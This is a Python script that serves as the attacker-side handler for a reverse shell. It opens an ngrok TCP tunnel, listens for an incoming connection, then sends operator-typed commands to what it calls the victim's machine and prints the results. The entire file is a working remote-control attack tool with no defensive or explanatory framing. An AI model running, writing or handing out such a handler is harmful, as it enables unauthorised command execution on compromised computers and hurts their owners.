import socket
import subprocess
import time

BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def main():
    try:
        ip = input("[+] Enter the IP for the reverse shell: ")
        port = input("[+] Enter the port number for the reverse shell and ngrok: ")

        print(GREEN + "[*] Starting ngrok tunnel..." + RESET)
        ngrok_process = subprocess.Popen(['ngrok', 'tcp', port])
        time.sleep(3)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, int(port)))
        s.listen(1)
        print(YELLOW + "[!] Waiting for incoming connection..." + RESET)
        client_socket, addr = s.accept()
        print(GREEN + f"[+] Connection established from {addr[0]}:{addr[1]}" + RESET)

        delimiter = "END_OF_CMD\n"

        while True:
            command = input(RED + "Enter a command to execute (or type 'exit' to quit): " + RESET)
            if command.lower() == "exit":
                break

            client_socket.send(command.encode())
            print(GREEN + "[+] Command sent, awaiting response..." + RESET)

            data = b""
            while delimiter.encode() not in data:
                data += client_socket.recv(4096)

            output = data.decode().replace(delimiter, "").strip()

            if output:
                print(GREEN + output + RESET)
                print(GREEN + "[+] Command executed successfully!" + RESET)
            else:
                print(YELLOW + "[!] No output returned from the victim's machine." + RESET)

    except Exception as e:
        print(RED + f"[!] Error occurred: {e}" + RESET)
    finally:
        ngrok_process.kill()
        print(RED + "[!] Ngrok tunnel closed." + RESET)


if __name__ == "__main__":
    main()
